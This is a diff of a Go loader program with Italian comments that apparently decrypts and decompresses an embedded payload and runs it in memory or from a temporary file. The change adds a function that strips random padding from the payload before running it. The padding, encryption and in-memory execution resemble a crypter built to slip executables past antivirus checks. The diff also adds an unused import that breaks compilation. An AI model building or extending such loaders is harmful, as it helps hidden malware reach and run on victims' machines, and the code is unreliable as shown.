@@ -16,6 +16,7 @@ import (
 	"os/exec"
 	"syscall"
 	"unsafe"
+	"runtime"
 	
 	"github.com/ulikunitz/xz"
 	"golang.org/x/crypto/chacha20poly1305"
@@ -72,11 +73,14 @@ func main() {
 		os.Exit(1)
 	}
 	
+	// 3.5 Rimuovi eventuale padding casuale usando OriginalSize
+	payload := trimToOriginal(decompressed, metadata.OriginalSize)
+	
 	// 4. Esegui
 	if metadata.UseInMemory {
-		executeInMemory(decompressed)
+		executeInMemory(payload)
 	} else {
-		executeFromTemp(decompressed)
+		executeFromTemp(payload)
 	}
 }
 
@@ -188,6 +192,31 @@ func removePadding(data []byte, offsets []int) []byte {
 		return data
 	}
 	// Implementazione semplificata
+	return data
+}
+
+// trimToOriginal ritaglia il buffer decompresso alla dimensione originale del payload.
+// Quando il padding casuale è abilitato, i byte di padding vengono aggiunti prima e dopo
+// il contenuto originale. Possiamo ricostruire l'originale prendendo la slice centrale
+// di lunghezza originalSize.
+func trimToOriginal(data []byte, originalSize uint64) []byte {
+	if originalSize == 0 {
+		return data
+	}
+	total := uint64(len(data))
+	if total == originalSize {
+		return data
+	}
+	if total > originalSize {
+		extra := total - originalSize
+		front := int(extra / 2)
+		start := front
+		end := start + int(originalSize)
+		if start >= 0 && end <= len(data) && end >= start {
+			return data[start:end]
+		}
+	}
+	// Fallback se le dimensioni sono inattese
 	return data
 }
 
